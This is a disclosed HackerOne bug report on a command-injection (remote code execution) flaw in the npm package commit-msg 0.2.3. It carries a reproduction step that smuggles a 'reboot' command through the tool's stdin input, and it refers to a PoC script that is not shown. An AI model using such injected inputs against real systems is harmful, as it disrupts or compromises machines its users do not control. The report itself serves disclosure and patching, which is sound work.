# [commit-msg] RCE via insecure command formatting

## Report Details
- **Report ID**: 885031
- **URL**: https://hackerone.com/reports/885031
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2020-05-28T19:08:57.534Z
- **Disclosed**: 2020-09-24T19:25:32.402Z

## Reporter
- **Username**: mik317
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nodejs-ecosystem

## Vulnerability Information
I would like to report a `RCE` issue in the `commit-msg` module.
It allows to execute `arbitrary commands remotely inside the victim's PC`

# Module
**module name:** `commit-msg`
**version:** `0.2.3`
**npm page:** `https://www.npmjs.com/package/commit-msg`

## Module Description
> commit-msg is a customizable git commit message parser and validator written in Node.js. It validates a given string based on best practices and can be used as a git hook, command line tool and/or directly through the API.

## Module Stats
[103] downloads in the last week

## Vulnerability Description
The issue occurs because a `user input` is formatted inside a `command` that will be executed without any check. The issue arises here: https://github.com/clns/node-commit-msg/blob/master/bin/validate#L128

## Steps To Reproduce:
1. Check there aren't files called `HACKED` 
1. Execute the following commands in another terminal:

```bash
npm i commit-msg -g # Install affected module
git init # Init the current dir as *git*
echo "test||reboot" | commit-msg stdin # Your machine will be rebooted because `reboot` command is injected
node poc.js #  Run the PoC
```
1. Recheck the files: now `HACKED` has been created :)

## Patch
> Don't format `commands` using insecure `user's inputs` :)

## Supporting Material/References:
- [OPERATING SYSTEM VERSION]: Kali Linux
- [NODEJS VERSION]: v12.16.1
- [NPM VERSION]: 6.13.4

# Wrap up
- I contacted the maintainer to let them know: [N] 
- I opened an issue in the related repository: [N]

## Impact

`RCE` via command formatting on `commit-msg`

## Attachments
No attachments
